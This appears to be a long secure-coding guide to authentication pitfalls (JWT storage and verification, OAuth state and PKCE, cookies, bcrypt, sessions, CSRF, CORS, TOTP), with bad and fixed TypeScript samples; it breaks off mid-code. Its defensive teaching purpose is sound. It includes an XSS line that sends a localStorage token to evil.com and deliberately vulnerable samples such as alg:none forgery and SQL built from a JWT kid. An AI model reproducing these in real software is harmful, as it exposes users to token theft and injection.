body:
Storing JWTs in localStorage exposes them to any JavaScript running on the page, including XSS payloads from third-party scripts or injection attacks.

```javascript
// BAD — any script can steal the token
localStorage.setItem('token', jwt);

// An XSS payload can do this:
fetch('https://evil.com/steal?token=' + localStorage.getItem('token'));
```

**Instead, use httpOnly cookies:**
```typescript
// Server-side: set JWT as httpOnly cookie
res.cookie('token', jwt, {
  httpOnly: true,   // Not accessible via JavaScript
  secure: true,     // HTTPS only
  sameSite: 'lax',  // CSRF protection
  maxAge: 15 * 60 * 1000, // 15 minutes
  path: '/',
});
```

httpOnly cookies cannot be read by `document.cookie` or any client-side JavaScript. The browser automatically attaches them to requests. This is the recommended approach for web applications. If you must use localStorage (e.g., for non-browser clients), ensure robust CSP headers and input sanitization.

When the server that issues a JWT and the server that validates it have different system clocks, tokens can be rejected before the user expects them to expire.

```typescript
// Token issued at server A (clock: 10:00:00)
const token = jwt.sign({ userId: 1 }, secret, { expiresIn: '15m' });
// exp = 10:15:00

// Server B (clock: 10:15:30 — 30 seconds ahead)
jwt.verify(token, secret); // throws TokenExpiredError!
```

**Fix: add a clockTolerance:**
```typescript
jwt.verify(token, secret, {
  clockTolerance: 30, // Allow 30 seconds of clock skew
});
```

In distributed systems, always set `clockTolerance` (also called `leeway` in some libraries). NTP synchronization reduces but doesn't eliminate drift. A 30-60 second tolerance is standard practice.

If you issue a long-lived refresh token and never rotate it, a stolen refresh token grants indefinite access.

```typescript
// BAD — same refresh token reused forever
app.post('/refresh', async (req, res) => {
  const { refreshToken } = req.body;
  const payload = jwt.verify(refreshToken, REFRESH_SECRET);
  const newAccessToken = jwt.sign({ userId: payload.userId }, ACCESS_SECRET, { expiresIn: '15m' });
  res.json({ accessToken: newAccessToken }); // refresh token never changes!
});
```

**GOOD — rotate refresh token on every use:**
```typescript
app.post('/refresh', async (req, res) => {
  const { refreshToken } = req.body;
  const stored = await db.refreshToken.findUnique({ where: { token: refreshToken } });
  if (!stored || stored.revoked) {
    // Possible replay attack — revoke entire family
    await db.refreshToken.updateMany({
      where: { familyId: stored?.familyId },
      data: { revoked: true },
    });
    return res.status(401).json({ error: 'Token reuse detected' });
  }

  // Revoke old, issue new
  await db.refreshToken.update({ where: { id: stored.id }, data: { revoked: true } });
  const newRefresh = crypto.randomUUID();
  await db.refreshToken.create({
    data: { token: newRefresh, userId: stored.userId, familyId: stored.familyId },
  });

  const newAccess = jwt.sign({ userId: stored.userId }, ACCESS_SECRET, { expiresIn: '15m' });
  res.json({ accessToken: newAccess, refreshToken: newRefresh });
});
```

The `familyId` groups all rotated tokens from the same login session. If a revoked token is reused, it signals theft — revoke the entire family to force re-authentication.

Some JWT libraries accept `alg: 'none'` by default, which means an attacker can forge tokens without any secret.

```typescript
// Attacker crafts a token with alg: none
// Header: { "alg": "none", "typ": "JWT" }
// Payload: { "userId": "admin", "role": "superadmin" }
// Signature: (empty)

// Vulnerable verification:
jwt.verify(token, secret); // Some libraries accept 'none' algorithm!
```

**Always specify allowed algorithms explicitly:**
```typescript
jwt.verify(token, secret, {
  algorithms: ['HS256'], // Only allow expected algorithm
});

// For RSA:
jwt.verify(token, publicKey, {
  algorithms: ['RS256'],
});
```

This also prevents the RSA/HMAC confusion attack where an attacker changes `RS256` to `HS256` and signs with the public key (which is publicly known). The `jsonwebtoken` npm package requires `algorithms` by default since v9, but older versions and other libraries may not.

The authorization code flow without PKCE is vulnerable to code interception attacks in public clients (SPAs, mobile apps) that cannot keep a client secret.

```typescript
// PKCE flow implementation
import crypto from 'crypto';

// Step 1: Generate code verifier and challenge
const codeVerifier = crypto.randomBytes(32).toString('base64url');
const codeChallenge = crypto
  .createHash('sha256')
  .update(codeVerifier)
  .digest('base64url');

// Step 2: Authorization request includes challenge
const authUrl = new URL('https://auth.example.com/authorize');
authUrl.searchParams.set('response_type', 'code');
authUrl.searchParams.set('client_id', CLIENT_ID);
authUrl.searchParams.set('redirect_uri', REDIRECT_URI);
authUrl.searchParams.set('code_challenge', codeChallenge);
authUrl.searchParams.set('code_challenge_method', 'S256');
authUrl.searchParams.set('scope', 'openid profile email');

// Step 3: Token exchange includes verifier
const tokenResponse = await fetch('https://auth.example.com/token', {
  method: 'POST',
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  body: new URLSearchParams({
    grant_type: 'authorization_code',
    code: authorizationCode,
    redirect_uri: REDIRECT_URI,
    client_id: CLIENT_ID,
    code_verifier: codeVerifier, // Proves we started the flow
  }),
});
```

OAuth 2.1 draft makes PKCE mandatory for all clients, not just public ones. Even confidential (server-side) clients benefit from PKCE as defense-in-depth. Always use `S256` method, never `plain`.

Setting `sameSite: 'lax'` (the browser default since Chrome 80) blocks cookies on cross-site POST requests. This breaks OAuth redirect flows and payment callbacks that use POST.

```typescript
// This cookie won't be sent on cross-site POST redirects
res.cookie('session', sessionId, {
  sameSite: 'lax',
  httpOnly: true,
  secure: true,
});

// OAuth provider redirects back via POST — cookie is missing!
// Payment gateway sends webhook via POST — cookie is missing!
```

**Solutions:**
```typescript
// Option 1: Use sameSite: 'none' (requires secure: true)
res.cookie('session', sessionId, {
  sameSite: 'none',
  httpOnly: true,
  secure: true, // REQUIRED with sameSite: 'none'
});

// Option 2: Handle the POST redirect with a GET bounce
app.post('/auth/callback', (req, res) => {
  // Store code in short-lived server session, redirect to GET
  const stateId = crypto.randomUUID();
  tempStore.set(stateId, req.body.code);
  res.redirect(`/auth/complete?state=${stateId}`);
});
```

`sameSite: 'lax'` is the safest default for most cookies. Only use `'none'` when you specifically need cross-site cookie sending, and pair it with CSRF tokens for protection.

bcrypt has a maximum input length of 72 bytes. Any characters beyond that are silently ignored, meaning two different passwords with the same first 72 bytes produce the same hash.

```typescript
import bcrypt from 'bcrypt';

const password72 = 'a'.repeat(72);
const password100 = 'a'.repeat(72) + 'EXTRA_CHARS';

const hash = await bcrypt.hash(password72, 10);
await bcrypt.compare(password100, hash); // true! Extra chars ignored
```

**Fix: pre-hash the password with SHA-256:**
```typescript
import { createHash } from 'crypto';
import bcrypt from 'bcrypt';

function hashPassword(password: string): Promise<string> {
  // SHA-256 produces a fixed 64-char hex string
  const prehash = createHash('sha256').update(password).digest('hex');
  return bcrypt.hash(prehash, 12);
}

function verifyPassword(password: string, hash: string): Promise<boolean> {
  const prehash = createHash('sha256').update(password).digest('hex');
  return bcrypt.compare(prehash, hash);
}
```

Alternatively, use Argon2 which has no practical input length limit and is the winner of the Password Hashing Competition.

If you register routes before session middleware, those routes won't have access to `req.session`. This is a common source of 'undefined session' bugs.

```typescript
// BAD — route registered before session middleware
app.get('/dashboard', (req, res) => {
  console.log(req.session); // undefined!
});

app.use(session({ secret: 'key', resave: false, saveUninitialized: false }));
```

```typescript
// GOOD — session middleware before routes
app.use(session({
  secret: process.env.SESSION_SECRET!,
  resave: false,
  saveUninitialized: false,
  cookie: { secure: true, httpOnly: true, maxAge: 24 * 60 * 60 * 1000 },
  store: new RedisStore({ client: redisClient }),
}));

app.get('/dashboard', (req, res) => {
  console.log(req.session.userId); // works
});
```

This applies to all Express middleware — order of `app.use()` calls determines the execution order. CORS, body parsers, and auth middleware all need to be registered before the routes that depend on them.

Using a static CSRF token or one that persists across sessions allows session fixation attacks where an attacker pre-sets a known token.

```typescript
// BAD — CSRF token never changes
const CSRF_TOKEN = crypto.randomBytes(32).toString('hex'); // Static!

// GOOD — per-session CSRF token
import csrf from 'csrf';
const tokens = new csrf();

app.use((req, res, next) => {
  if (!req.session.csrfSecret) {
    req.session.csrfSecret = tokens.secretSync();
  }
  res.locals.csrfToken = tokens.create(req.session.csrfSecret);
  next();
});

// Validate on state-changing requests
app.use((req, res, next) => {
  if (['POST', 'PUT', 'DELETE', 'PATCH'].includes(req.method)) {
    const token = req.headers['x-csrf-token'] || req.body._csrf;
    if (!tokens.verify(req.session.csrfSecret, token)) {
      return res.status(403).json({ error: 'Invalid CSRF token' });
    }
  }
  next();
});
```

Modern alternatives: Use `SameSite=Strict` cookies plus custom request headers (the 'double submit cookie' pattern), or use framework-provided CSRF protection like Next.js Server Actions which handle this automatically.

The default NextAuth.js session object only contains `name`, `email`, and `image`. If you need the user ID or custom fields, you must extend the session callback.

```typescript
// Without customization:
session.user = { name: 'John', email: 'john@example.com', image: '...' };
// session.user.id is UNDEFINED

// Fix: extend session and JWT callbacks
export const authOptions: NextAuthOptions = {
  providers: [...],
  callbacks: {
    async jwt({ token, user }) {
      if (user) {
        token.id = user.id;
        token.role = user.role; // Custom field
      }
      return token;
    },
    async session({ session, token }) {
      session.user.id = token.id as string;
      session.user.role = token.role as string;
      return session;
    },
  },
};

// Also extend the types:
declare module 'next-auth' {
  interface Session {
    user: {
      id: string;
      role: string;
      name?: string | null;
      email?: string | null;
      image?: string | null;
    };
  }
}

declare module 'next-auth/jwt' {
  interface JWT {
    id: string;
    role: string;
  }
}
```

When using the database session strategy instead of JWT, use the `session` callback with the `user` parameter instead of `token`.

The `state` parameter in OAuth flows prevents CSRF attacks. Using predictable values (timestamps, sequential IDs) defeats its purpose.

```typescript
// BAD — predictable state
const state = Date.now().toString(); // Attacker can guess this

// BAD — no state validation
app.get('/auth/callback', (req, res) => {
  // Just uses the code without checking state
  exchangeCodeForToken(req.query.code);
});

// GOOD — cryptographically random state with validation
app.get('/auth/login', (req, res) => {
  const state = crypto.randomBytes(32).toString('hex');
  req.session.oauthState = state;

  res.redirect(`https://provider.com/authorize?` +
    `client_id=${CLIENT_ID}&state=${state}&redirect_uri=${REDIRECT_URI}`);
});

app.get('/auth/callback', (req, res) => {
  if (req.query.state !== req.session.oauthState) {
    return res.status(403).json({ error: 'State mismatch — possible CSRF' });
  }
  delete req.session.oauthState; // Single-use
  exchangeCodeForToken(req.query.code);
});
```

The state should be single-use and tied to the user's session. Some libraries encode the return URL in the state parameter — always validate the decoded URL against an allowlist to prevent open redirect attacks.

If `serializeUser` stores the full user object but `deserializeUser` expects an ID (or vice versa), authentication silently fails — `req.user` is undefined with no error.

```typescript
// BAD — mismatch between serialize and deserialize
passport.serializeUser((user, done) => {
  done(null, user); // Stores entire user object
});

passport.deserializeUser((id, done) => {
  // Receives the full user object, tries to use it as an ID!
  User.findById(id, done); // Fails silently: id is actually {name, email, ...}
});
```

```typescript
// GOOD — consistent serialize/deserialize
passport.serializeUser((user: any, done) => {
  done(null, user.id); // Store only the ID in the session
});

passport.deserializeUser(async (id: string, done) => {
  try {
    const user = await User.findById(id);
    done(null, user); // Attach full user to req.user
  } catch (err) {
    done(err, null);
  }
});
```

Always serialize just the user ID to keep session storage small. Deserialize fetches the fresh user on each request, ensuring up-to-date roles and permissions.

Rate limiting login endpoints by IP alone fails behind shared NATs, VPNs, and proxies where thousands of users share an IP. It also misses distributed brute-force attacks from many IPs.

```typescript
import rateLimit from 'express-rate-limit';

// BAD — IP-only rate limiting
const loginLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 5 });

// GOOD — compound key: IP + username
import { RateLimiterRedis } from 'rate-limiter-flexible';

const loginLimiter = new RateLimiterRedis({
  storeClient: redisClient,
  keyPrefix: 'login_fail',
  points: 5,          // 5 attempts
  duration: 15 * 60,  // per 15 minutes
});

app.post('/login', async (req, res) => {
  const key = `${req.ip}_${req.body.email}`;

  try {
    await loginLimiter.consume(key);
  } catch {
    return res.status(429).json({
      error: 'Too many login attempts',
      retryAfter: Math.ceil(rateLimiterRes.msBeforeNext / 1000),
    });
  }

  const user = await authenticate(req.body.email, req.body.password);
  if (user) {
    await loginLimiter.delete(key); // Reset on success
    return res.json({ token: generateToken(user) });
  }
  res.status(401).json({ error: 'Invalid credentials' });
});
```

Use Redis-backed rate limiting for multi-instance deployments. Add exponential backoff (increasing lockout time with consecutive failures) for additional protection against brute force.

Backup codes for 2FA are equivalent to passwords. If stored in plaintext and the database is compromised, attackers can bypass 2FA entirely.

```typescript
// BAD — plaintext backup codes
await db.user.update({
  where: { id: userId },
  data: { backupCodes: ['abc123', 'def456', 'ghi789'] },
});

// GOOD — hash each backup code
import { hash, verify } from 'argon2';

async function generateBackupCodes(userId: string): Promise<string[]> {
  const codes = Array.from({ length: 10 }, () =>
    crypto.randomBytes(4).toString('hex') // e.g., 'a1b2c3d4'
  );

  const hashedCodes = await Promise.all(
    codes.map(code => hash(code))
  );

  await db.backupCode.createMany({
    data: hashedCodes.map(h => ({ userId, hash: h, used: false })),
  });

  return codes; // Show to user ONCE, never store plaintext
}

async function verifyBackupCode(userId: string, code: string): Promise<boolean> {
  const storedCodes = await db.backupCode.findMany({
    where: { userId, used: false },
  });

  for (const stored of storedCodes) {
    if (await verify(stored.hash, code)) {
      await db.backupCode.update({ where: { id: stored.id }, data: { used: true } });
      return true;
    }
  }
  return false;
}
```

Show backup codes exactly once at generation time. Encourage users to store them in a password manager. Mark codes as used after verification to prevent reuse.

When using `credentials: 'include'` in fetch requests, the server cannot respond with `Access-Control-Allow-Origin: *`. The browser blocks the response.

```typescript
// Client:
fetch('https://api.example.com/data', {
  credentials: 'include', // Send cookies cross-origin
});

// BAD — server responds with wildcard
app.use(cors({ origin: '*', credentials: true }));
// Browser error: "Cannot use wildcard in Access-Control-Allow-Origin when credentials flag is true"

// GOOD — explicit origin(s)
app.use(cors({
  origin: ['https://myapp.com', 'https://staging.myapp.com'],
  credentials: true,
}));

// GOOD — dynamic origin with validation
app.use(cors({
  origin: (origin, callback) => {
    const allowed = ['https://myapp.com', 'https://staging.myapp.com'];
    if (!origin || allowed.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true,
}));
```

This is a security feature — wildcard + credentials would allow any site to make authenticated requests. Always maintain an explicit allowlist of origins.

If a user registers with Google (john@example.com) then tries to login with GitHub (same email), you get a new account or a conflict error — not automatic account linking.

```typescript
// Naive approach — creates duplicate accounts
async function handleOAuthLogin(profile: OAuthProfile) {
  let user = await db.user.findFirst({
    where: { accounts: { some: { provider: profile.provider, providerAccountId: profile.id } } },
  });
  if (!user) {
    user = await db.user.create({ data: { email: profile.email, name: profile.name } });
  }
  return user;
}

// Better — link accounts by verified email
async function handleOAuthLogin(profile: OAuthProfile) {
  let user = await db.user.findUnique({ where: { email: profile.email } });

  if (user) {
    // Link new provider to existing account
    await db.account.upsert({
      where: { provider_providerAccountId: { provider: profile.provider, providerAccountId: profile.id } },
      create: { userId: user.id, provider: profile.provider, providerAccountId: profile.id },
      update: {},
    });
  } else {
    user = await db.user.create({
      data: {
        email: profile.email,
        accounts: { create: { provider: profile.provider, providerAccountId: profile.id } },
      },
    });
  }
  return user;
}
```

Only auto-link accounts when the email from the OAuth provider is verified (`email_verified: true`). Otherwise, an attacker could create a GitHub account with someone else's email to gain access to their account.

Query parameters are logged by web servers, proxies, CDNs, and browser history. They also leak through the `Referer` header when navigating to external links.

```
# BAD — API key in query string
GET /api/data?api_key=sk_live_abc123

# Shows up in:
# - Nginx/Apache access logs
# - CDN logs (Cloudflare, Akamai)
# - Browser history
# - Referer header if page has external links
```

**Always send API keys in headers:**
```typescript
// Client
fetch('/api/data', {
  headers: { 'Authorization': 'Bearer sk_live_abc123' },
  // Or custom header:
  // 'X-API-Key': 'sk_live_abc123',
});

// Server validation
function extractApiKey(req: Request): string | null {
  const auth = req.headers.get('authorization');
  if (auth?.startsWith('Bearer ')) return auth.slice(7);
  return req.headers.get('x-api-key');
}
```

If you must support query parameter keys for legacy reasons, ensure your logging pipeline redacts them. Use short-lived, scoped tokens for query parameter authentication (like pre-signed URLs).

JWTs are signed (integrity) but not encrypted (confidentiality). Anyone can decode the payload without the secret.

```typescript
// BAD — sensitive data in JWT payload
const token = jwt.sign({
  userId: '123',
  ssn: '123-45-6789',      // Anyone can read this!
  creditCard: '4111...',    // This too!
  internalRole: 'admin',
}, secret);

// Decoding requires NO secret:
const payload = JSON.parse(atob(token.split('.')[1]));
console.log(payload.ssn); // '123-45-6789'
```

**Only include non-sensitive identifiers:**
```typescript
const token = jwt.sign({
  sub: '123',       // User ID
  role: 'user',     // Non-sensitive role
  iss: 'myapp',     // Issuer
  aud: 'myapp-api', // Audience
}, secret, { expiresIn: '15m' });
```

If you need encrypted tokens, use JWE (JSON Web Encryption) via the `jose` library. Keep JWT payloads small — they're sent with every request.

Setting `secure: true` on cookies means they only send over HTTPS. In local development over `http://localhost`, the cookie is silently dropped.

```typescript
// This cookie is invisible on http://localhost:3000
res.cookie('session', value, {
  secure: true,
  httpOnly: true,
  sameSite: 'lax',
});

// Fix: conditionally set secure based on environment
res.cookie('session', value, {
  secure: process.env.NODE_ENV === 'production',
  httpOnly: true,
  sameSite: 'lax',
});

// In Next.js middleware:
const cookieOptions = {
  httpOnly: true,
  sameSite: 'lax' as const,
  secure: process.env.NODE_ENV === 'production',
  path: '/',
  maxAge: 60 * 60 * 24 * 7, // 1 week
};
```

Note: `localhost` is treated as a secure context by most browsers, so `secure: true` actually works on `http://localhost` in Chrome and Firefox. However, it fails on `http://192.168.x.x` or custom local domains without HTTPS.

Using `===` to compare tokens or hashes is vulnerable to timing attacks — the comparison short-circuits on the first mismatched character, leaking how many characters matched.

```typescript
// BAD — vulnerable to timing attack
if (providedToken === storedToken) { /* grant access */ }

// GOOD — constant-time comparison
import { timingSafeEqual } from 'crypto';

function safeCompare(a: string, b: string): boolean {
  if (a.length !== b.length) {
    // Compare against itself to maintain constant time
    // but still return false
    timingSafeEqual(Buffer.from(a), Buffer.from(a));
    return false;
  }
  return timingSafeEqual(Buffer.from(a), Buffer.from(b));
}

// Use for: API keys, CSRF tokens, password reset tokens, webhook signatures
if (safeCompare(providedToken, storedToken)) {
  // Grant access
}
```

This applies to any secret comparison: API keys, CSRF tokens, webhook signatures, HMAC digests. bcrypt/argon2 `verify` functions already use constant-time comparison internally.

Calling `passport.authenticate()` directly instead of using it as middleware causes `req.login()` and `req.user` to not be populated.

```typescript
// BAD — calling authenticate() directly
app.post('/login', (req, res) => {
  const result = passport.authenticate('local'); // Returns middleware, doesn't execute it!
  // req.user is undefined
});

// GOOD — use as middleware
app.post('/login',
  passport.authenticate('local', { failureRedirect: '/login' }),
  (req, res) => {
    // req.user is populated
    res.redirect('/dashboard');
  }
);

// GOOD — custom callback for API responses
app.post('/login', (req, res, next) => {
  passport.authenticate('local', (err: Error, user: User, info: any) => {
    if (err) return next(err);
    if (!user) return res.status(401).json({ error: info.message });
    req.logIn(user, (err) => {
      if (err) return next(err);
      res.json({ user: { id: user.id, email: user.email } });
    });
  })(req, res, next); // Must invoke the returned middleware!
});
```

The custom callback pattern is preferred for APIs because `failureRedirect` sends HTML redirects, not JSON errors. Note the `(req, res, next)` invocation at the end — `passport.authenticate()` returns a middleware function that must be called.

If the session ID doesn't change after login, an attacker who set the session ID beforehand (via URL, XSS, or subdomain cookie) retains access.

```typescript
// BAD — session ID stays the same after login
app.post('/login', async (req, res) => {
  const user = await authenticate(req.body.email, req.body.password);
  req.session.userId = user.id; // Same session ID as before login!
  res.redirect('/dashboard');
});

// GOOD — regenerate session after login
app.post('/login', async (req, res) => {
  const user = await authenticate(req.body.email, req.body.password);

  req.session.regenerate((err) => {
    if (err) return res.status(500).json({ error: 'Session error' });
    req.session.userId = user.id; // New session ID
    req.session.save((err) => {
      if (err) return res.status(500).json({ error: 'Session error' });
      res.redirect('/dashboard');
    });
  });
});
```

`req.session.regenerate()` creates a new session ID and destroys the old one. Call it on every privilege level change: login, 2FA completion, role elevation.

The `argon2` npm package requires native C bindings. It fails in Vercel Edge Functions, Cloudflare Workers, and some serverless environments that don't support native modules.

```
// Error in Vercel Edge / Cloudflare Workers:
Error: Cannot find module 'argon2'
Caused by: Dynamic require of "argon2" is not supported
```

**Solutions by environment:**
```typescript
// Option 1: Use @node-rs/argon2 (WASM-based, works in more environments)
import { hash, verify } from '@node-rs/argon2';
const hashed = await hash(password);
const isValid = await verify(hashed, password);

// Option 2: Use bcrypt for edge (pure JS implementation exists)
import bcrypt from 'bcryptjs'; // Pure JS, no native deps

// Option 3: Offload hashing to a Node.js API route
// Edge middleware → calls /api/auth/hash (Node.js runtime)
```

If you use Next.js, set `export const runtime = 'nodejs'` on auth API routes to ensure they don't run on the edge. For Cloudflare Workers, the Web Crypto API is available but doesn't include password hashing algorithms.

Time-based One-Time Passwords (TOTP) are valid for 30-second windows. Network latency and clock drift mean the user might submit a code for an adjacent window.

```typescript
import { authenticator } from 'otplib';

// BAD — strict single-window verification
const isValid = authenticator.check(userCode, secret);
// Fails if user is 1 second into the next window

// GOOD — allow adjacent windows
authenticator.options = {
  window: 1, // Accept codes from 1 window before and after
  // This means codes from t-30s, t, t+30s are all valid
};

const isValid = authenticator.verify({ token: userCode, secret });

// Also prevent code reuse within the validity window
app.post('/verify-2fa', async (req, res) => {
  const { code } = req.body;
  const user = req.session.pendingUser;

  if (await isCodeRecentlyUsed(user.id, code)) {
    return res.status(401).json({ error: 'Code already used' });
  }

  if (!authenticator.verify({ token: code, secret: user.totpSecret })) {
    return res.status(401).json({ error: 'Invalid code' });
  }

  await markCodeUsed(user.id, code);
  // Complete authentication...
});
```

Store the last used code timestamp per user to prevent replay attacks within the validity window. A `window: 1` setting means 3 valid codes at any time (previous, current, next).

Long-lived or reusable password reset tokens are a major security risk — they sit in email inboxes indefinitely and can be reused after the password is changed.

```typescript
// BAD — no expiry, reusable
const resetToken = crypto.randomUUID();
await db.user.update({ where: { email }, data: { resetToken } });

// GOOD — short-lived, single-use, hashed
async function createResetToken(email: string) {
  const token = crypto.randomBytes(32).toString('hex');
  const hashedToken = crypto.createHash('sha256').update(token).digest('hex');

  await db.passwordReset.create({
    data: {
      email,
      token: hashedToken, // Store hash, not plaintext
      expiresAt: new Date(Date.now() + 60 * 60 * 1000), // 1 hour
    },
  });

  return token; // Send this in the email
}

async function resetPassword(token: string, newPassword: string) {
  const hashedToken = crypto.createHash('sha256').update(token).digest('hex');

  const reset = await db.passwordReset.findFirst({
    where: { token: hashedToken, expiresAt: { gt: new Date() }, used: false },
  });

  if (!reset) throw new Error('Invalid or expired token');

  await db.$transaction([
    db.user.update({ where: { email: reset.email }, data: { password: await hash(newPassword) } }),
    db.passwordReset.update({ where: { id: reset.id }, data: { used: true } }),
    // Invalidate all sessions for this user
    db.session.deleteMany({ where: { userEmail: reset.email } }),
  ]);
}
```

Always hash reset tokens before storage (they're equivalent to temporary passwords). Invalidate all existing sessions after a password change. Use 1-hour expiry maximum.

The `kid` (Key ID) header tells the server which key to use for verification. If the server blindly uses the kid to look up keys, an attacker can inject arbitrary key references.

```typescript
// BAD — using kid to look up keys from untrusted source
const decoded = jwt.decode(token, { complete: true });
const key = await fetchKey(decoded.header.kid); // Attacker controls kid!
jwt.verify(token, key);

// BAD — kid used in SQL query (SQL injection!)
const key = await db.query(`SELECT key FROM keys WHERE kid = '${decoded.header.kid}'`);

// GOOD — validate kid against known set
const TRUSTED_KEYS: Record<string, string> = {
  'key-2024': process.env.JWT_KEY_2024!,
  'key-2025': process.env.JWT_KEY_2025!,
};

function getVerificationKey(header: jwt.JwtHeader): string {
  const key = TRUSTED_KEYS[header.kid!];
  if (!key) throw new Error(`Unknown key ID: ${header.kid}`);
  return key;
}

jwt.verify(token, getVerificationKey);
```

For JWKS (JSON Web Key Sets) from OAuth providers, use a library like `jwks-rsa` that caches and validates keys from the provider's well-known endpoint.

A bcrypt cost factor (salt rounds) of 10 was reasonable in 2010. Modern GPUs can crack these hashes significantly faster.

```typescript
import bcrypt from 'bcrypt';

// BAD — too fast on modern hardware
const hash = await bcrypt.hash(password, 10); // ~100ms on 2015 hardware, ~10ms on 2024 GPU

// GOOD — appropriate for 2024+
const hash = await bcrypt.hash(password, 12); // ~250ms on modern hardware

// Benchmark to find right value for your server:
async function benchmarkBcrypt() {
  for (const rounds of [10, 11, 12, 13, 14]) {
    const start = Date.now();
    await bcrypt.hash('test', rounds);
    console.log(`Rounds ${rounds}: ${Date.now() - start}ms`);
  }
}
// Target: 250-500ms per hash on your production hardware
```

The cost factor is exponential — each increment doubles the time. Target 250-500ms per hash: fast enough not to degrade UX, slow enough to resist brute force. If migrating, re-hash on next successful login and update the stored hash.

This error occurs when `jwt.verify()` receives something that isn't a properly formatted JWT (three base64url segments separated by dots).

```
JsonWebTokenError: jwt malformed
```

**Common causes and fixes:**
```typescript
// Cause 1: 'Bearer ' prefix not stripped
const auth = req.headers.authorization; // 'Bearer eyJhbG...'
jwt.verify(auth, secret); // Fails! Includes 'Bearer ' prefix

// Fix:
const token = auth?.startsWith('Bearer ') ? auth.slice(7) : auth;
jwt.verify(token, secret);

// Cause 2: Token is undefined or null
const token = req.cookies.token; // undefined if cookie not set
jwt.verify(token, secret); // 'jwt malformed'

// Fix: check before verifying
if (!token) return res.status(401).json({ error: 'No token provided' });

// Cause 3: Token is an object (already decoded)
const token = jwt.decode(rawToken); // Returns an object
jwt.verify(token, secret); // Fails! Expects a string

// Fix: pass the raw string token
jwt.verify(rawToken, secret);
```

Always validate that the token exists and is a non-empty string before calling `jwt.verify()`. Extract the token from the Authorization header carefully.

This error fires when a JWT's `exp` claim is in the past. Handle it differently from other auth errors to enable token refresh.

```typescript
import jwt from 'jsonwebtoken';

try {
  const payload = jwt.verify(token, secret);
} catch (err) {
  if (err instanceof jwt.TokenExpiredError) {
    // Token was valid but expired — try refresh
    return res.status(401).json({
      error: 'token_expired',
      message: 'Access token expired, please refresh',
    });
  }
  if (err instanceof jwt.JsonWebTokenError) {
    // Token is invalid (tampered, malformed)
    return res.status(401).json({
      error: 'token_invalid',
      message: 'Invalid token',
    });
  }
  if (err instanceof jwt.NotBeforeError) {
    // Token not yet active (nbf claim)
    return res.status(401).json({
      error: 'token_not_active',
      message: 'Token not yet valid',
    });
  }
}
```

**Client-side refresh flow:**
```typescript
async function fetchWithAuth(url: string, options: RequestInit = {}) {
  let res = await fetch(url, {
    ...options,
    headers: { ...options.headers, Authorization: `Bearer ${getAccessToken()}` },
  });

  if (res.status === 401) {
    const data = await res.json();
    if (data.error === 'token_expired') {
      const refreshed = await refreshAccessToken();
      if (refreshed) {
        res = await fetch(url, {
          ...options,
          headers: { ...options.headers, Authorization: `Bearer ${getAccessToken()}` },
        });
      }
    }
  }
  return res;
}
```

Distinguish between expired tokens (refresh-eligible) and invalid tokens (require re-authentication). Never expose the reason for authentication failure beyond these categories.

This occurs when the secret/key passed to `jwt.verify()` is `undefined`, typically from a missing environment variable.

```typescript
// JWT_SECRET is not set in .env
const secret = process.env.JWT_SECRET; // undefined
jwt.verify(token, secret); // Error: secret or public key must be provided
```

**Fix: validate environment variables at startup:**
```typescript
// config.ts — fail fast if secrets are missing
function requireEnv(name: string): string {
  const value = process.env[name];
  if (!value) throw new Error(`Missing required environment variable: ${name}`);
  return value;
}

export const config = {
  jwtSecret: requireEnv('JWT_SECRET'),
  jwtRefreshSecret: requireEnv('JWT_REFRESH_SECRET'),
} as const;

// Usage — guaranteed to be defined
import { config } from './config';
jwt.verify(token, config.jwtSecret);
```

With Zod:
```typescript
import { z } from 'zod';
const envSchema = z.object({
  JWT_SECRET: z.string().min(32, 'JWT secret must be at least 32 characters'),
  JWT_REFRESH_SECRET: z.string().min(32),
});
const env = envSchema.parse(process.env);
```

Failing at startup is much better than failing at the first auth request in production.

The browser sends an OPTIONS preflight request before cross-origin requests. If your auth middleware intercepts OPTIONS requests and returns 401, the actual request never fires.

```
Access to fetch at 'https://api.example.com/data' from origin 'https://myapp.com'
has been blocked by CORS policy: Response to preflight request doesn't pass
access control check: It does not have HTTP ok status.
```

**Fix: ensure CORS middleware runs before auth:**
```typescript
import cors from 'cors';

// CORS middleware FIRST — handles OPTIONS before auth
app.use(cors({
  origin: 'https://myapp.com',
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization'],
}));

// Auth middleware AFTER cors
app.use(authMiddleware);

// Or skip auth for OPTIONS explicitly
function authMiddleware(req: Request, res: Response, next: NextFunction) {
  if (req.method === 'OPTIONS') return next(); // Skip auth for preflight
  // ... verify token
}
```

The CORS middleware automatically responds to OPTIONS requests with the appropriate headers and a 204 status, before the request reaches your auth middleware.

Session middleware configured with Redis store fails because Redis isn't running or the connection URL is wrong.

```
Error: connect ECONNREFUSED 127.0.0.1:6379
    at TCPConnectWrap.afterConnect [as oncomplete]
```

**Fix:**
```typescript
import RedisStore from 'connect-redis';
import { createClient } from 'redis';

const redisClient = createClient({
  url: process.env.REDIS_URL || 'redis://localhost:6379',
  socket: {
    reconnectStrategy: (retries) => {
      if (retries > 10) return new Error('Redis max retries reached');
      return Math.min(retries * 100, 3000); // Exponential backoff
    },
  },
});

redisClient.on('error', (err) => console.error('Redis error:', err));
redisClient.on('connect', () => console.log('Redis connected'));

await redisClient.connect();

app.use(session({
  store: new RedisStore({ client: redisClient }),
  secret: process.env.SESSION_SECRET!,
  resave: false,
  saveUninitialized: false,
}));
```

In development, you can fall back to in-memory sessions:
```typescript
const sessionConfig: session.SessionOptions = {
  secret: process.env.SESSION_SECRET!,
  resave: false,
  saveUninitialized: false,
};

if (process.env.REDIS_URL) {
  sessionConfig.store = new RedisStore({ client: redisClient });
} else {
  console.warn('No REDIS_URL — using in-memory sessions (not for production)');
}
```

This error occurs when `bcrypt.compare()` receives undefined/null for either argument, typically when the user doesn't exist in the database.

```
Error: data and hash arguments required
    at Object.compare (bcrypt.js:209:16)
```

```typescript
// BAD — user might be null
app.post('/login', async (req, res) => {
  const user = await db.user.findUnique({ where: { email: req.body.email } });
  const valid = await bcrypt.compare(req.body.password, user.password);
  // TypeError if user is null!
});

// GOOD — check user exists and use constant-time response
app.post('/login', async (req, res) => {
  const user = await db.user.findUnique({ where: { email: req.body.email } });

  if (!user) {
    // Still hash to prevent timing-based user enumeration
    await bcrypt.hash(req.body.password, 12);
